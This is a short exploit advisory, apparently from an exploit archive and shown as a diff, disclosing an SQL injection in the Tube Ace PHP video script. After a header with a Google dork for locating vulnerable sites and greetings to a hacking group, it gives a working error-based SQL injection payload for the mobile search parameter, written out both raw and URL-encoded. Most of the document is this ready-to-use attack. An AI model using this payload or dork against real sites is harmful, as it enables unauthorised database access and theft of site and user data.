@@ -1,0 +1,34 @@
+# Exploit Title: Tube Ace(Adult PHP Tube Script) SQL Injection
+# Date: 05/02/2012
+# Author: Daniel Godoy
+# Author Mail: DanielGodoy[at]GobiernoFederal[dot]com
+# Author Web: www.delincuentedigital.com.ar
+# Software: Tube Ace
+# http://www.tubeace.com
+# Tested on: Linux
+# Dork: "?viewStandard=0"
+  
+[Comment]
+Greetz: Hernan Jais, Alfonso Cuevas, SPEED, Sensei, Incid3nt,
+Maximiliano Soler
+    Sunplace, Pablin77,_tty0, Login-Root,Knet,Kikito,Duraznit0,
+InyeXion
+    her0, r0dr1 y demas user de RemoteExecution 
+    www.remoteexecution.info www.remoteexcution.com.ar 
+    #RemoteExecution Hacking Group
+
+[PoC]
+
+http://localhost/mobile/search/?q=[SQL Injection]
+
+http://localhost/mobile/search/?q=1') AND (SELECT 9602 FROM(SELECT
+COUNT(*),CONCAT(CHAR(58,109,111,110,58),(SELECT (CASE WHEN
+(9602=9602) THEN 1 ELSE 0
+END)),CHAR(58,107,109,109,58),FLOOR(RAND(0)*2))x FROM
+information_schema.tables GROUP BY x)a) AND ('LMEk'='LMEk&channel=
+
+[DEMO]
+
+http://server/mobile/search/?q=1%27%29%20AND%20%28SELECT%209602%20FROM%28SELECT%20COUNT%28*%29,CONCAT%28CHAR%2858,109,111,110,58%29,%28SELECT%20%28CASE%20WHEN%20%289602=9602%29%20THEN%201%20ELSE%200%20END%29%29,CHAR%2858,107,109,109,58%29,FLOOR%28RAND%280%29*2%29%29x%20FROM%20information_schema.tables%20GROUP%20BY%20x%29a%29%20AND%20%28%27LMEk%27=%27LMEk&channel=
+
+
